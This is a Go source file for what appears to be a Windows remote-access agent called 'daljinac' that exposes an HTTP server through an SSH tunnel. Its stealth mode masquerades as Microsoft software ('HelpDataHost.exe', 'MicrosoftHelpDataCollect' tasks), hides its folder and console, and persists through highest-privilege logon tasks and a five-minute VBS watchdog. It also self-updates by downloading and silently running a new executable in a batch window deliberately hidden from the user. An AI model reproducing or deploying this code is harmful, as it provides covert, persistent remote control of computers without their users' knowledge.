package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"agent/server"
	"agent/tray"
	"agent/tunnel"
)

const maxLogSize = 1 * 1024 * 1024

var logFile *os.File
var isStealth bool

const (
	_stealthDir       = "C:\\ProgramData\\Microsoft\\HelpData"
	_stealthExeName   = "HelpDataHost.exe"
	_stealthTaskName  = "MicrosoftHelpDataCollect"
	_stealthWatchName = "MicrosoftHelpDataWatch"
)

func initLog() {
	var logDir string
	if isStealth {
		os.MkdirAll(_stealthDir, 0755)
		logDir = _stealthDir
	} else {
		logDir = filepath.Join(os.Getenv("ProgramData"), "daljinac")
		if err := os.MkdirAll(logDir, 0755); err != nil {
			logDir = "C:\\daljinac"
			os.MkdirAll(logDir, 0755)
		}
	}
	logName := "daljinac.log"
	if isStealth {
		logName = "helphost.log"
	}
	logPath := filepath.Join(logDir, logName)
	if fi, err := os.Stat(logPath); err == nil && fi.Size() > maxLogSize {
		os.Rename(logPath, logPath+".old")
	}
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("WARN: cannot open log %s: %v", logPath, err)
		return
	}
	logFile = f
	log.SetOutput(io.MultiWriter(f, os.Stdout))
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.Printf("=== systemUI v%s starting ===", version)
}

func syncLog() {
	if logFile != nil {
		logFile.Sync()
	}
}

const version = "2.6.29"

func hideConsole() {
	if runtime.GOOS != "windows" {
		return
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	user32 := syscall.NewLazyDLL("user32.dll")
	showWindow := user32.NewProc("ShowWindow")
	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0) // SW_HIDE = 0
	}
}

func writeStartupMarker() {
	dir := "C:\\daljinac"
	if isStealth {
		dir = _stealthDir
	}
	os.MkdirAll(dir, 0755)
	os.WriteFile(filepath.Join(dir, "started.txt"), []byte(time.Now().Format(time.RFC3339)+"\n"), 0644)
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			b := make([]byte, 4096)
			n := runtime.Stack(b, true)
			log.Printf("PANIC: %v\n%s", r, b[:n])
			syncLog()
		}
	}()

	// Check -stealth, -install, -remove via os.Args BEFORE any init
	for _, a := range os.Args {
		if a == "-stealth" {
			isStealth = true
		}
	}
	for _, a := range os.Args {
		if a == "-install" {
			doInstall()
			return
		}
		if a == "-remove" {
			doRemove()
			return
		}
	}

	writeStartupMarker()
	initLog()
	hideConsole()
	time.Sleep(2 * time.Second)

	port := flag.Int("port", 8081, "HTTP port")
	tag := flag.String("tag", "", "Machine tag")
	noTray := flag.Bool("notray", false, "No system tray")
	flag.Parse()

	// Stealth forces no-tray
	if isStealth {
		*noTray = true
	}

	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Printf("Port %d in use — another instance running. Exiting.", *port)
		return
	}

	shutdown := make(chan struct{})
	hostname, _ := os.Hostname()
	log.Printf("Hostname: %s, Version: %s, Port: %d, Tray: %v", hostname, version, *port, !*noTray)

	srv := server.New(*tag, version)

	var t tunnel.Tunnel
	onConnect := func(url string) {
		srv.SetInfo("daljinac", hostname, url)
	}

	// Start HTTP server — ln is already open (port check passed), so Serve cannot fail in startup
	go func() {
		defer func() { recover() }()
		if err := srv.StartWithListener(ln); err != nil {
			log.Printf("HTTP error: %v", err)
		}
	}()

	tr := tray.New(hostname, version)
	tr.OnUpdate = func() {
		log.Println("[main] update requested — removing tray icon")
		tr.RemoveIcon()
		if err := doUpdate(); err != nil {
			log.Printf("Update: %v", err)
		}
	}
	srv.SetOnUpdate(func() {
		log.Println("[main] update via HTTP API")
		tr.RemoveIcon()
		if err := doUpdate(); err != nil {
			log.Printf("Update: %v", err)
		}
	})

	tr.OnRestartTunnel = func() {
		log.Println("[main] restarting tunnel")
		if t != nil {
			t.Stop()
		}
	}
	tr.OnExit = func() {
		if t != nil {
			t.Stop()
		}
		srv.Stop()
		close(shutdown)
	}

	// Re-set info now that tray exists
	onConnect = func(url string) {
		srv.SetInfo("daljinac", hostname, url)
		tr.SetURL(url)
		tr.SetRunning()
		tr.SetStatusIcon(tray.IconConnected)
	}
	srv.SetInfo("daljinac", hostname, "")

	if !*noTray {
		log.Println("[main] waiting for Explorer (3s)...")
		time.Sleep(3 * time.Second)
		log.Println("[main] starting tray goroutine")
		go tr.Run()
	} else {
		log.Println("Headless mode")
	}

	t = tunnel.NewSSH(*port, hostname, onConnect)
	t.Start()

	go func() {
		for {
			time.Sleep(3 * time.Minute)
			if t == nil {
				continue
			}
			since := time.Since(t.LastConnected())
			if since > 10*time.Minute {
				log.Printf("[watchdog] tunnel not connected for %v, exiting (task will restart)", since)
				syncLog()
				os.Exit(1)
			}
		}
	}()

	if *noTray {
		select {}
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-shutdown:
	case <-sig:
	}

	log.Println("Shutdown")
	if t != nil {
		t.Stop()
	}
	srv.Stop()
	tr.Stop()
}

func doInstall() {
	exe, _ := os.Executable()

	dir := "C:\\daljinac"
	taskName := "Daljinac"
	watchName := "DaljinacWatch"
	if isStealth {
		dir = _stealthDir
		taskName = _stealthTaskName
		watchName = _stealthWatchName
	}
	os.MkdirAll(dir, 0755)

	vbsFile := filepath.Join(dir, "watchdog.vbs")
	vbs := fmt.Sprintf("CreateObject(\"WScript.Shell\").Run \"schtasks /run /tn %s\", 0, False\n", taskName)
	os.WriteFile(vbsFile, []byte(vbs), 0644)

	// Clean all task variants
	exec.Command("schtasks", "/delete", "/tn", "Daljinac", "/f").Run()
	exec.Command("schtasks", "/delete", "/tn", "DaljinacWatch", "/f").Run()
	exec.Command("schtasks", "/delete", "/tn", _stealthTaskName, "/f").Run()
	exec.Command("schtasks", "/delete", "/tn", _stealthWatchName, "/f").Run()

	taskCmd := exe
	if isStealth {
		taskCmd = fmt.Sprintf("%s -stealth", exe)
	}
	exec.Command("schtasks", "/create", "/tn", taskName, "/tr", taskCmd, "/sc", "ONLOGON", "/rl", "HIGHEST", "/f").Run()
	exec.Command("schtasks", "/create", "/tn", watchName, "/tr", fmt.Sprintf("wscript.exe //B %s", vbsFile), "/sc", "MINUTE", "/mo", "5", "/f").Run()

	if isStealth {
		exec.Command("attrib", "+h", "+s", dir).Run()
	}

	exec.Command("cmd", "/c", "start", "", "/min", exe).Run()
	log.Println("Installed (scheduled task + watchdog)")
}

func doRemove() {
	exeName := "systemUI.exe"
	taskName := "Daljinac"
	watchName := "DaljinacWatch"
	if isStealth {
		exeName = _stealthExeName
		taskName = _stealthTaskName
		watchName = _stealthWatchName
	}
	exec.Command("taskkill", "/f", "/im", exeName).Run()
	exec.Command("taskkill", "/f", "/im", "daljinac.exe").Run()
	exec.Command("schtasks", "/delete", "/tn", taskName, "/f").Run()
	exec.Command("schtasks", "/delete", "/tn", watchName, "/f").Run()

	// Also clean opposite mode
	if isStealth {
		exec.Command("schtasks", "/delete", "/tn", "Daljinac", "/f").Run()
		exec.Command("schtasks", "/delete", "/tn", "DaljinacWatch", "/f").Run()
	} else {
		exec.Command("schtasks", "/delete", "/tn", _stealthTaskName, "/f").Run()
		exec.Command("schtasks", "/delete", "/tn", _stealthWatchName, "/f").Run()
	}

	dir := "C:\\daljinac"
	if isStealth {
		dir = _stealthDir
	}
	os.Remove(filepath.Join(dir, "watchdog.vbs"))
	log.Println("Removed")
}

func updateURL() string {
	return "https://github.com/egzakutacno/daljinac/releases/latest/download/daljinac.exe"
}

func doUpdate() error {
	tmpDir := filepath.Join(os.TempDir(), "daljinac-update")
	os.MkdirAll(tmpDir, 0755)

	dlURL := updateURL()
	newExe := filepath.Join(tmpDir, "daljinac.exe")
	log.Printf("Downloading %s", dlURL)
	resp, err := http.Get(dlURL)
	if err != nil {
		return fmt.Errorf("download: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	out, _ := os.Create(newExe)
	io.Copy(out, resp.Body)
	out.Close()

	current, _ := os.Executable()

	argsFile := filepath.Join(tmpDir, "args.txt")
	stealthArg := ""
	if isStealth {
		stealthArg = " -stealth"
	}
	fullCmd := fmt.Sprintf(`"%s"%s`, current, stealthArg)
	os.WriteFile(argsFile, []byte(fullCmd), 0644)

	taskName := "Daljinac"
	watchName := "DaljinacWatch"
	vbsPath := "C:\\daljinac\\watchdog.vbs"
	checkExe := "systemUI.exe"
	killExe2 := "daljinac.exe"
	if isStealth {
		taskName = _stealthTaskName
		watchName = _stealthWatchName
		vbsPath = _stealthDir + "\\watchdog.vbs"
		checkExe = _stealthExeName
		killExe2 = _stealthExeName
	}

	logFile := filepath.Join(tmpDir, "update.log")
	bat := filepath.Join(tmpDir, "up.bat")
	batch := fmt.Sprintf(`@echo off
set LOG="%s"
echo %%date%% %%time%% [update] starting >> %%LOG%%
set /p CMD=<"%s"
echo %%date%% %%time%% [update] copying new binary >> %%LOG%%
copy /y "%s" "%s" >> %%LOG%% 2>&1
if %%errorlevel%% neq 0 (
    echo %%date%% %%time%% [update] COPY FAILED errorlevel=%%errorlevel%% >> %%LOG%%
    exit /b 1
)
echo %%date%% %%time%% [update] copy OK, killing old instance >> %%LOG%%
taskkill /f /im systemUI.exe >> %%LOG%% 2>&1
taskkill /f /im %s >> %%LOG%% 2>&1
taskkill /f /im %s >> %%LOG%% 2>&1
timeout /t 2 /nobreak > nul
echo %%date%% %%time%% [update] writing watchdog.vbs >> %%LOG%%
echo CreateObject("WScript.Shell").Run "schtasks /run /tn %s", 0, False > "%s"
echo %%date%% %%time%% [update] registering scheduled tasks >> %%LOG%%
schtasks /delete /tn "%s" /f >> %%LOG%% 2>&1
schtasks /create /tn "%s" /tr "%%CMD%%" /sc ONLOGON /rl HIGHEST /f >> %%LOG%% 2>&1

REM Start app via schtasks (once), retry directly if needed
echo %%date%% %%time%% [update] starting app >> %%LOG%%
schtasks /run /tn "%s" >> %%LOG%% 2>&1
for /l %%i in (1,1,3) do (
  timeout /t 5 /nobreak > nul
  tasklist /fi "imagename eq %s" 2>nul | find /i "%s" >nul
  if not errorlevel 1 goto RUNNING
  echo %%date%% %%time%% [update] attempt %%i: not running, starting directly >> %%LOG%%
  start "" /min %%CMD%% >> %%LOG%% 2>&1
)
echo %%date%% %%time%% [update] WARN: app not running after 3 attempts, watchdog will retry >> %%LOG%%
:RUNNING

REM Now safe to delete old watchdog and create new one
schtasks /delete /tn "%s" /f >> %%LOG%% 2>&1
schtasks /create /tn "%s" /tr "wscript.exe //B %s" /sc MINUTE /mo 5 /f >> %%LOG%% 2>&1
echo %%date%% %%time%% [update] done, cleaning up >> %%LOG%%
del "%s"
del "%%~f0"
`, logFile, argsFile, newExe, current,
		killExe2, _stealthExeName,
		taskName, vbsPath,
		taskName, taskName,
		taskName,
		checkExe, strings.TrimSuffix(checkExe, ".exe"),
		watchName, watchName, vbsPath,
		argsFile)
	os.WriteFile(bat, []byte(batch), 0644)

	log.Printf("Update batch: %s", bat)
	log.Printf("Update log: %s", logFile)
	log.Printf("Update URL: %s (saving as %s -> %s)", dlURL, newExe, current)

	shell32 := syscall.NewLazyDLL("shell32.dll")
	se := shell32.NewProc("ShellExecuteW")
	ret, _, _ := se.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("cmd"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("/C \""+bat+"\""))),
		0, 0) // SW_HIDE — ne pokazuj CMD prozor korisniku
	log.Printf("ShellExecuteW ret=%d", ret)

	log.Println("Update launched, exiting")
	os.Exit(0)
	return nil
}
